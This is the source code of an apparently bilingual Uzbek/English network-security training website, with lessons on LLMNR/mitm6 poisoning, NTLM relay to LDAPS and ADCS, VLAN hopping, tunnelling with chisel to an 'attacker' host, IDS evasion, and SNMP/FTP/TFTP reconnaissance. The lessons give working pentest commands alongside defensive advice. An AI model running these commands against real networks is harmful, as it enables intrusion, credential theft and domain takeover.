...
// ── Constants ────────────────────────────────────────────────
const PROG_KEY="na_progress",ROUTE_KEY="na_route",THEME_KEY="na_theme",LANG_KEY="na_lang",TIME_KEY="na_time_spent";
...
const SECTIONS={
  1:{num:"01",uz:"Tarmoq Asoslari",en:"Network Fundamentals",color:"var(--c-system)",icon:"network",count:12,
     ...
     outcomesUz:["OSI va TCP/IP modellarini qatlamma-qatlam tushuntirish","IP manzillash va subnetting'ni amalda qo'llash","DNS va HTTP protokollarining ishlash mexanizmini bilish","Routing va switching asoslarini tushunish"],
     outcomesEn:["Explain the OSI and TCP/IP models layer by layer","Apply IP addressing and subnetting in practice","Understand how DNS and HTTP protocols work","Understand routing and switching fundamentals"],
     tooling:["Wireshark","ping","traceroute","ipconfig/ifconfig","Cisco Packet Tracer"]},
...
const ALL_BADGES=[
  ...
  {icon:"check",uz:"Kurs tugallandi",en:"Course complete",color:"var(--c-defense)",unlock:c=>c.length>=30},
  {icon:"layers",uz:"OSI ustasi",en:"OSI master",color:"var(--c-system)",unlock:c=>c.includes(naKey(1))},
  {icon:"network",uz:"TCP/IP bilimdoni",en:"TCP/IP expert",color:"var(--c-system)",unlock:c=>c.includes(naKey(2))},
  {icon:"globe",uz:"DNS tergovchisi",en:"DNS investigator",color:"var(--c-system)",unlock:c=>c.includes(naKey(4))},
  {icon:"code",uz:"HTTP/HTTPS eksperti",en:"HTTP/HTTPS expert",color:"var(--c-user)",unlock:c=>c.includes(naKey(5))},
  {icon:"network",uz:"Routing ustasi",en:"Routing master",color:"var(--c-user)",unlock:c=>c.includes(naKey(8))},
  {icon:"wifi",uz:"Simsiz mutaxassisi",en:"Wireless specialist",color:"var(--c-user)",unlock:c=>c.includes(naKey(12))},
  {icon:"shield",uz:"Firewall qo'riqchisi",en:"Firewall guardian",color:"var(--c-auth)",unlock:c=>c.includes(naKey(13))},
  {icon:"lock",uz:"VPN muhandisi",en:"VPN engineer",color:"var(--c-auth)",unlock:c=>c.includes(naKey(14))},
  {icon:"eye",uz:"IDS/IPS kuzatuvchisi",en:"IDS/IPS watcher",color:"var(--c-auth)",unlock:c=>c.includes(naKey(16))},
  {icon:"shield-check",uz:"DMZ arxitektori",en:"DMZ architect",color:"var(--c-auth)",unlock:c=>c.includes(naKey(17))},
  {icon:"shield-check",uz:"Zero Trust tarafdori",en:"Zero Trust advocate",color:"var(--c-auth)",unlock:c=>c.includes(naKey(21))},
  {icon:"target",uz:"Port skaner ustasi",en:"Port scan master",color:"var(--c-attack)",unlock:c=>c.includes(naKey(22))},
  {icon:"bug",uz:"ARP zaharlash tergovchisi",en:"ARP poisoning investigator",color:"var(--c-attack)",unlock:c=>c.includes(naKey(24))},
  {icon:"bug",uz:"MITM ovchisi",en:"MITM hunter",color:"var(--c-attack)",unlock:c=>c.includes(naKey(25))},
  {icon:"zap",uz:"DoS/DDoS bilimdoni",en:"DoS/DDoS expert",color:"var(--c-attack)",unlock:c=>c.includes(naKey(27))},
  {icon:"graph",uz:"Wireshark tahlilchisi",en:"Wireshark analyst",color:"var(--c-attack)",unlock:c=>c.includes(naKey(28))},
  {icon:"eye",uz:"Tarmoq detektivi",en:"Network detective",color:"var(--c-attack)",unlock:c=>c.includes(naKey(30))},
  {icon:"network",uz:"Tarmoq Asoslari ustasi",en:"Network Fundamentals master",color:"var(--c-system)",unlock:c=>Array.from({length:12},(_,i)=>naKey(i+1)).every(k=>c.includes(k))},
  {icon:"shield",uz:"Tarmoq Xavfsizligi ustasi",en:"Network Security master",color:"var(--c-auth)",unlock:c=>Array.from({length:9},(_,i)=>naKey(i+13)).every(k=>c.includes(k))},
  {icon:"flame",uz:"Yarim yo'l",en:"Halfway there",color:"var(--c-warn)",unlock:c=>c.length>=15},
  {icon:"spark",uz:"Qattiq ishladi",en:"Hard worker",color:"var(--c-attack)",unlock:c=>c.length>=22},
];

const SKILL_NODES=[
  {id:"basics",uz:"Tarmoq Asoslari",en:"Network Basics",icon:"network",color:"var(--c-system)",unlockAt:3},
  {id:"protocols",uz:"Protokollar",en:"Core Protocols",icon:"layers",color:"var(--c-user)",unlockAt:7},
  {id:"security",uz:"Tarmoq Xavfsizligi",en:"Network Security",icon:"shield",color:"var(--c-auth)",unlockAt:13},
  {id:"defense",uz:"Zamonaviy Himoya",en:"Modern Defense",icon:"lock",color:"var(--c-warn)",unlockAt:18},
  {id:"attacks",uz:"Hujum Texnikalari",en:"Attack Techniques",icon:"cpu",color:"var(--c-attack)",unlockAt:25},
  {id:"forensics",uz:"Forensika",en:"Forensics",icon:"eye",color:"var(--accent)",unlockAt:30},
];
...
function ContinueCard({setRoute,user}){
  ...
  const nextNum=Array.from({length:totalLessons},(_,i)=>i+1).find(n=>!completed.includes(naKey(n)))||1;
  ...
  return React.createElement("div",{style:{position:"relative",height:360}},
    React.createElement("svg",{viewBox:"0 0 600 360",style:{width:"100%",height:"100%"}},
      React.createElement("defs",null,
        React.createElement("filter",{id:"na-st-glow",x:"-50%",y:"-50%",width:"200%",height:"200%"},
      ...
      React.createElement("g",{filter:"url(#na-st-glow)"},
        nodes.map(n=>{
  ...
  return React.createElement("nav",{style:{position:"sticky",top:0,zIndex:100,height:60,background:"rgba(4,6,13,0.92)",backdropFilter:"blur(12px)",borderBottom:"1px solid var(--border)",display:"flex",alignItems:"center",padding:"0 24px",gap:12}},
    ...
    user&&React.createElement("div",{onClick:onOpenProfile,style:{display:"flex",alignItems:"center",gap:9,padding:"4px 12px 4px 4px",borderRadius:999,background:"var(--surface)",border:"1px solid var(--border)",cursor:"pointer"}},
      React.createElement("div",{style:{position:"relative",flexShrink:0}},
        React.createElement("div",{style:{width:26,height:26,borderRadius:"50%",background:"linear-gradient(135deg,var(--accent),#4d8bff,#00ff88)",padding:1.5,boxShadow:"0 0 8px var(--accent-glow)"}},
          React.createElement("div",{style:{width:"100%",height:"100%",borderRadius:"50%",background:"#0a0a12",display:"grid",placeItems:"center"}},
            React.createElement("span",{style:{background:"linear-gradient(135deg,var(--accent),#4d8bff)",WebkitBackgroundClip:"text",WebkitTextFillColor:"transparent",fontSize:9,fontWeight:900,fontFamily:"var(--font-mono)"}},(user.name||"Student").slice(0,2).toUpperCase()))),
...
function LandingScreen({setRoute}){
  const lang=useLang();
  const stats=[
    {n:"30",uz:"Dars",en:"Lessons"},
    {n:"3",uz:"Bo'lim",en:"Sections"},
    {n:"20+",uz:"Laboratoriya",en:"Labs"},
    ...
    React.createElement("div",{style:{display:"grid",gridTemplateColumns:"1.15fr 1fr",gap:40,alignItems:"center"}},
      React.createElement("div",{className:"fade-up"},
        React.createElement("div",{className:"eyebrow",style:{display:"flex",alignItems:"center",gap:10,marginBottom:16}},
          React.createElement(LiveDot,null),
          React.createElement("span",null,"SECTOR_03 // NETWORK_ATTACK_TRAINING")),
        React.createElement("h1",{className:"display",style:{fontSize:"clamp(32px,4.6vw,56px)",lineHeight:1.06,margin:0,letterSpacing:"-0.03em",fontWeight:600,color:"var(--text-0)"}},
          lang==="en"
            ?React.createElement(React.Fragment,null,"The first academy that",React.createElement("br",null),"truly teaches ",React.createElement("span",{style:{background:"linear-gradient(90deg,var(--accent),#4d8bff)",WebkitBackgroundClip:"text",WebkitTextFillColor:"transparent"}},"network security"),".")
            :React.createElement(React.Fragment,null,"Tarmoq xavfsizligini",React.createElement("br",null),React.createElement("span",{style:{background:"linear-gradient(90deg,var(--accent),#4d8bff)",WebkitBackgroundClip:"text",WebkitTextFillColor:"transparent"}},"chuqur o'rganish"),"ning ilk akademiyasi.")),
        ...
        React.createElement("div",{style:{display:"flex",gap:12,marginTop:28,flexWrap:"wrap"}},
          ...
          React.createElement("a",{className:"btn",href:"../index.html",style:{textDecoration:"none",display:"inline-flex",alignItems:"center",gap:6}},React.createElement(Icon,{name:"layers",size:13}),t(lang," Windows Academy"," Windows Academy"))),
...
function HeroVisual(){
  const lang=useLang();
  const orbitIcons=["network","lock","key","shield","database","wifi","code","cpu"];
  const orbitColors=["var(--c-system)","var(--c-attack)","var(--c-auth)","var(--accent)","var(--c-user)","var(--c-system)","var(--c-warn)","var(--accent-2)"];
  return React.createElement("div",{style:{position:"relative",aspectRatio:"1",maxWidth:420,margin:"0 auto"}},
    React.createElement("svg",{viewBox:"0 0 400 400",style:{width:"100%",height:"100%"}},
      React.createElement("defs",null,
        React.createElement("radialGradient",{id:"core-grad-na",cx:"50%",cy:"50%",r:"50%"},
        ...
        React.createElement("filter",{id:"hero-glow-na",x:"-50%",y:"-50%",width:"200%",height:"200%"},
      ...
      React.createElement("circle",{cx:200,cy:200,r:80,fill:"url(#core-grad-na)"}),
      React.createElement("circle",{cx:200,cy:200,r:42,fill:"var(--bg-2)",stroke:"var(--accent)",strokeWidth:2,filter:"url(#hero-glow-na)"}),
    ...
    React.createElement("div",{style:{position:"absolute",top:"5%",left:"-5%",background:"var(--surface)",border:"1px solid var(--accent-border)",borderRadius:8,padding:"8px 12px",fontFamily:"var(--font-mono)",fontSize:11,color:"var(--accent)",backdropFilter:"blur(10px)",display:"flex",alignItems:"center",gap:6}},
      React.createElement(LiveDot,null),t(lang,"Paket · ushlanmoqda","Packet · captured")),
    React.createElement("div",{style:{position:"absolute",bottom:"12%",right:"-5%",background:"var(--surface)",border:"1px solid rgba(255,58,94,0.3)",borderRadius:8,padding:"8px 12px",fontFamily:"var(--font-mono)",fontSize:11,color:"var(--c-attack)",backdropFilter:"blur(10px)",display:"flex",alignItems:"center",gap:6}},
      React.createElement(Icon,{name:"wifi",size:11}),t(lang,"ARP spoofing aniqlandi","ARP spoofing detected")),
    React.createElement("div",{style:{position:"absolute",top:"45%",right:"-8%",background:"var(--surface)",border:"1px solid rgba(184,140,255,0.3)",borderRadius:8,padding:"8px 12px",fontFamily:"var(--font-mono)",fontSize:11,color:"var(--c-auth)",backdropFilter:"blur(10px)",display:"flex",alignItems:"center",gap:6}},
      React.createElement(Icon,{name:"lock",size:11}),t(lang,"Firewall · DROP","Firewall · DROP")));
}
      ...
      React.createElement("aside",{style:{position:"sticky",top:90,display:"flex",flexDirection:"column",gap:16}},
        React.createElement("div",{className:"glass",style:{padding:20}},
          ...
          React.createElement("div",{style:{display:"flex",gap:12,alignItems:"center"}},
            React.createElement("div",{style:{width:44,height:44,borderRadius:"50%",background:"linear-gradient(135deg, var(--c-attack), var(--c-warn))",color:"#04060d",fontWeight:700,display:"grid",placeItems:"center",fontFamily:"var(--font-mono)",fontSize:14}},"DK"),
            React.createElement("div",null,
...
function App(){
  ...
  const navProps={setRoute,user,routeName,setLang,onOpenProfile:()=>setProfileOpen(true),onOpenAI:()=>setAiOpen(true)};
...
function LessonL31(){
  ...
  return React.createElement("section",null,
    ...
    React.createElement(H2,{num:"§5"},t(lang,"Protokollar: nega bu zaiflik bor","The protocols: why this flaw exists")),
    React.createElement(P,null,t(lang,"LLMNR (UDP 5355) va NBT-NS (UDP 137) — DNS ishlamaganda ishga tushadigan «zaxira» nom-aniqlash protokollari. Ular multicast/broadcast bilan «bu nomni kim biladi?» deb so'raydi va HECH QANDAY autentifikatsiyasiz kelgan javobga ishonadi — ildiz zaiflik aynan shu ishonch. mDNS (UDP 5353) Apple/Linux muhitida xuddi shunday ishlaydi. Bular tarixan qulaylik uchun yoqilgan, hujumchi uchun esa «bepul» NTLM hash manbai.","LLMNR (UDP 5355) and NBT-NS (UDP 137) are «fallback» name-resolution protocols that kick in when DNS fails. They ask the network «who knows this name?» via multicast/broadcast and trust ANY answer with NO authentication — that trust is the root flaw. mDNS (UDP 5353) works the same way on Apple/Linux. Enabled historically for convenience, they are a «free» source of NTLM hashes for an attacker.")),
    React.createElement(Terminal,null,"LLMNR:  UDP 5355  multicast 224.0.0.252   (Windows Vista+)\nNBT-NS: UDP 137   broadcast               (eski NetBIOS)\nmDNS:   UDP 5353                          (Apple Bonjour / Linux Avahi)\n# Umumiy kamchilik: autentifikatsiya YO'Q -> istalgan javob qabul qilinadi"),
    React.createElement(H2,{num:"§6"},t(lang,"Zamonaviy vektor: mitm6 (IPv6 DNS egallash)","Modern vector: mitm6 (IPv6 DNS takeover)")),
    React.createElement(P,null,t(lang,"Zamonaviy tarmoqlarda IPv6 odatda YOQILGAN, lekin sozlanmagan. mitm6 soxta IPv6 router e'loni (RA) yuborib, o'zini DNS server qilib ko'rsatadi; Windows IPv6'ni IPv4'dan AFZAL ko'radi, shu sabab BUTUN DNS so'rovlari hujumchiga keladi — LLMNR'dan ancha kengroq nazorat. Ko'pincha ntlmrelayx bilan zanjirlanadi (L32) va to'g'ridan-to'g'ri imtiyoz oshirishga olib boradi.","On modern networks IPv6 is usually ENABLED but unconfigured. mitm6 sends spoofed IPv6 router advertisements (RA) and presents itself as the DNS server; Windows PREFERS IPv6 over IPv4, so ALL DNS queries go to the attacker — far broader control than LLMNR. It is often chained with ntlmrelayx (L32) and leads straight to privilege escalation.")),
    React.createElement(Terminal,null,"mitm6 -d corp.local\nntlmrelayx.py -6 -t ldaps://dc.corp.local -wh fakewpad.corp.local\n# Windows IPv6 DNS'ni afzal ko'radi -> auth hujumchiga -> relay -> imtiyoz oshirish"),
...
function LessonL32(){
  ...
  return React.createElement("section",null,
    ...
    React.createElement(H2,{num:"§5"},t(lang,"Relay nishonlari — SMB'dan Domain Admin'gacha","Relay targets — from SMB to Domain Admin")),
    React.createElement(P,null,t(lang,"Ushlangan autentifikatsiyani QAYERGA relay qilish natijaning kuchini belgilaydi. SMB — boshqa xostga kirish, SAM/hash dump, buyruq bajarish (agar hisob admin bo'lsa). LDAP/LDAPS (domen kontrolleri) — domenga kompyuter qo'shish, RBCD (resource-based delegation) yoki ACL suiiste'moli, ko'pincha to'g'ridan-to'g'ri Domain Admin. HTTP — ADCS (ESC8) relay orqali sertifikat olish va uzoq muddatli kirish.","Where you RELAY the captured authentication determines the impact. SMB — log into another host, dump SAM/hashes, run commands (if the account is admin). LDAP/LDAPS (a domain controller) — add a computer to the domain, RBCD (resource-based delegation) or ACL abuse, often directly to Domain Admin. HTTP — get a certificate via an ADCS (ESC8) relay for long-term access.")),
    React.createElement(P,null,t(lang,"Muhim cheklov: relay FAQAT imzolash (signing) MAJBURIY bo'lmagan xizmatga ishlaydi. SMB signing yoqilgan bo'lsa — SMB relay to'xtaydi; LDAP signing/channel binding — LDAP relay'ni to'xtatadi. Shuning uchun zamonaviy hujum ko'pincha mitm6 (IPv6, L31) + LDAPS relay zanjiri.","Key constraint: a relay only works against a service where signing is NOT enforced. SMB signing stops SMB relay; LDAP signing/channel binding stops LDAP relay. Hence the modern attack is often a mitm6 (IPv6, L31) + LDAPS relay chain.")),
    React.createElement(Terminal,null,"# LDAPS relay -> RBCD -> Domain Admin (mitm6 bilan zanjir):\nmitm6 -d corp.local\nntlmrelayx.py -6 -t ldaps://dc.corp.local --delegate-access\n# HTTP -> ADCS (ESC8) -> domen sertifikati:\nntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp --adcs"),
...
function LessonL33(){
  ...
  return React.createElement("section",null,
    ...
    React.createElement(H2,{num:"§5"},t(lang,"Double tagging mexanizmi va DHCP → domen zanjiri","Double-tagging mechanics and the DHCP → domain chain")),
    React.createElement(P,null,t(lang,"Ikki marta teglash qanday ishlaydi: hujumchi paketga IKKI VLAN teg qo'yadi — tashqi teg NATIVE VLAN (odatda 1) bo'ladi. Birinchi switch tashqi (native) tegni olib tashlaydi, chunki native VLAN teglanmaydi, va ichki tegli paketni trunk orqali uzatadi; ikkinchi switch ichki teg bo'yicha paketni boshqa VLAN'ga «sakratadi». Cheklov: bu FAQAT bir tomonlama (javob qaytmaydi) va hujumchi native VLAN'da bo'lishi shart.","How double tagging works: the attacker puts TWO VLAN tags on the packet — the outer tag is the NATIVE VLAN (usually 1). The first switch strips the outer (native) tag, because the native VLAN is untagged, and forwards the inner-tagged packet over the trunk; the second switch «hops» the packet into another VLAN by the inner tag. Constraint: it is ONE-WAY only (no reply) and the attacker must be on the native VLAN.")),
    React.createElement(P,null,t(lang,"Rogue DHCP odatda kattaroq zanjirning boshi: soxta DHCP gateway VA DNS'ni hujumchi qilib beradi -> butun trafik + DNS nazorati -> Responder/mitm6 (L31) bilan birga NTLM hash ushlash/relay (L32) -> domenga kirish. Shuning uchun L2 himoyasi (DHCP snooping, DAI, DTP off) bitta emas — BUTUN zanjirni uzadi.","Rogue DHCP is usually the start of a bigger chain: the fake DHCP hands out itself as gateway AND DNS -> control of all traffic + DNS -> combined with Responder/mitm6 (L31) to capture/relay NTLM hashes (L32) -> domain access. That is why L2 defenses (DHCP snooping, DAI, DTP off) break not one step but the WHOLE chain.")),
    React.createElement(Terminal,null,"# Double tagging (bir tomonlama, native VLAN talab qiladi):\n[ Eth ][ VLAN 1 = native ][ VLAN 20 ][ payload ]\n#  1-switch native tegni olib tashlaydi -> 2-switch VLAN 20 ga yetkazadi\n# Rogue DHCP -> gateway+DNS = hujumchi -> mitm6/Responder zanjiri -> domen"),
...
function LessonL35(){
  ...
  return React.createElement("section",null,
    ...
    React.createElement(H2,{num:"§6"},t(lang,"Zamonaviy tunnel vositalari","Modern tunnel tooling")),
    React.createElement(P,null,t(lang,"SSH proksi klassik, lekin real hujumda ko'pincha SSH bo'lmaydi yoki firewall faqat 80/443 ni ochadi. Zamonaviy vositalar: chisel — HTTP/WebSocket ustidan tunnel (cheklovchi firewall orqali o'tadi); ligolo-ng — buzilgan xostda TUN interfeys yaratadi, shuning uchun proxychains KERAK EMAS va butun ichki tarmoq to'g'ridan-to'g'ri ko'rinadi; Metasploit'da autoroute + socks_proxy. Ko'p qatlamli tarmoqda «double pivot» (A -> B -> C) ichma-ich proksilar bilan quriladi.","An SSH proxy is classic, but in a real engagement there is often no SSH, or the firewall only allows 80/443. Modern tools: chisel — a tunnel over HTTP/WebSocket (gets through a restrictive firewall); ligolo-ng — creates a TUN interface on the compromised host, so proxychains is NOT needed and the whole internal network is directly reachable; in Metasploit, autoroute + socks_proxy. In multi-layer networks a «double pivot» (A -> B -> C) is built with nested proxies.")),
    React.createElement(Terminal,null,"# chisel (HTTP tunnel — cheklovchi firewall orqali):\n#   hujumchi:  chisel server -p 8080 --reverse\n#   qurbon A:  chisel client attacker:8080 R:socks\n# ligolo-ng (TUN interfeys — proxychains KERAK EMAS):\n#   agent A da ishlaydi -> ichki 172.16.0.0/24 to'g'ridan-to'g'ri ko'rinadi\n# Metasploit:  run autoroute -s 172.16.5.0/24 ; use auxiliary/server/socks_proxy"),
...
function LessonL36(){
  ...
  return React.createElement("section",null,
    ...
    React.createElement(H2,{num:"§5"},t(lang,"Nega evazi ishlaydi — shifrlash va zamonaviy chegaralar","Why evasion works — encryption and modern limits")),
    React.createElement(P,null,t(lang,"Imzo-asosli IDS FAQAT o'zi ko'rgan naqshni ushlaydi. Ikki katta ko'r nuqta bor: (1) SHIFRLASH — tarmoq IDS'i HTTPS ichini ko'rmaydi (TLS inspeksiya bo'lmasa), shu sabab hujumchi C2 (boshqaruv) trafigini HTTPS yoki DNS tunnel ichida yashiradi; (2) yangi yoki biroz o'zgartirilgan payload imzolar bazasida yo'q. Shuning uchun zamonaviy himoya faqat imzoga tayanmaydi.","A signature-based IDS only catches patterns it has already seen. There are two big blind spots: (1) ENCRYPTION — a network IDS can't see inside HTTPS (without TLS inspection), so the attacker hides C2 (command-and-control) traffic inside HTTPS or a DNS tunnel; (2) a new or slightly modified payload isn't in the signature database. That is why modern defense does not rely on signatures alone.")),
    React.createElement(Terminal,null,"# Shifrlangan C2 — tarmoq IDS ko'rmaydi (TLS inspeksiya bo'lmasa):\nHTTPS beacon (443)      DNS tunneling (TXT so'rovlar ichida)\n# Living-off-the-land: standart tizim vositalari (yangi imzo yo'q)\n# Zamonaviy himoya:  TLS inspeksiya + EDR (xost darajasi) + anomaliya/ML"),
...
function LessonL42(){
  ...
  return React.createElement("section",null,
    ...
    React.createElement(H2,{num:"§5"},t(lang,"Pentest: SNMP enumeration va NTP recon","Pentest: SNMP enumeration and NTP recon")),
    React.createElement(P,null,t(lang,"Pentestda SNMP — oltin kon. Community string («public» ko'pincha standart) bilan snmpwalk BUTUN qurilmani ochib beradi: interfeyslar, ARP/routing jadvallari, ishlayotgan jarayonlar, o'rnatilgan dasturlar, Windows'da foydalanuvchi/share/servislar, ba'zan config'dagi parollar. Community string'ni onesixtyone bilan brute qilinadi. NTP esa recon (eski monlist buyrug'i so'nggi mijozlar ro'yxatini beradi) va amplifikatsiya DDoS (27-dars) uchun suiiste'mol qilinadi.","In a pentest SNMP is a goldmine. With a community string («public» is often the default) snmpwalk dumps the WHOLE device: interfaces, ARP/routing tables, running processes, installed software, on Windows even users/shares/services, and sometimes credentials in the config. The community string is brute-forced with onesixtyone. NTP, in turn, is abused for recon (the old monlist command lists recent clients) and amplification DDoS (lesson 27)."),
    ),
    React.createElement(Terminal,null,"# SNMP enumeration (community string bilan):\nonesixtyone -c community.txt 10.0.0.1      # community string brute\nsnmpwalk -v2c -c public 10.0.0.1           # BUTUN qurilmani dump\nsnmp-check 10.0.0.1                          # Windows user/share/process\n# NTP recon:\nntpq -c rv 10.0.0.1 ;  ntpdc -c monlist 10.0.0.1   # so'nggi mijozlar"),
...
function LessonL44(){
  ...
  return React.createElement("section",null,
    ...
    React.createElement(H2,{num:"§5"},t(lang,"Pentest: FTP/TFTP recon va sniffing","Pentest: FTP/TFTP recon and sniffing")),
    React.createElement(P,null,t(lang,"Fayl protokollari pentestda recon manbai. FTP'da anonim kirish (anonymous:anonymous) ko'p joyda ochiq qoladi; banner versiyaga qarshi ma'lum CVE topiladi; yozish mumkin va web'dan ko'rinsa — webshell yuklab RCE. FTP kredensiallari MITM (L24/L25) bilan osongina tinglanadi. TFTP autentifikatsiyasiz: tarmoq qurilmalari config'lari (ko'pincha parolli!) TFTP orqali zaxiralanadi — hujumchi ularni to'g'ridan-to'g'ri so'rab oladi.","File protocols are a recon source in a pentest. FTP anonymous login (anonymous:anonymous) is often left open; the banner version points to a known CVE; if writable and web-accessible — upload a webshell for RCE. FTP credentials are easily sniffed via MITM (L24/L25). TFTP has no authentication: network-device configs (often with passwords!) are backed up over TFTP — the attacker just requests them.")),
    React.createElement(Terminal,null,"# FTP recon:\nftp 10.0.0.5           # anonymous:anonymous ni sinab ko'ring\nnmap --script ftp-anon,ftp-syst -p21 10.0.0.5    # anonim + versiya banneri\n# TFTP (autentifikatsiyasiz — config o'g'irlash):\ntftp 10.0.0.1 -c get running-config\n# Sniffing: MITM (L24/L25) + tcpdump -A 'tcp port 21'  ->  USER/PASS ochiq"),
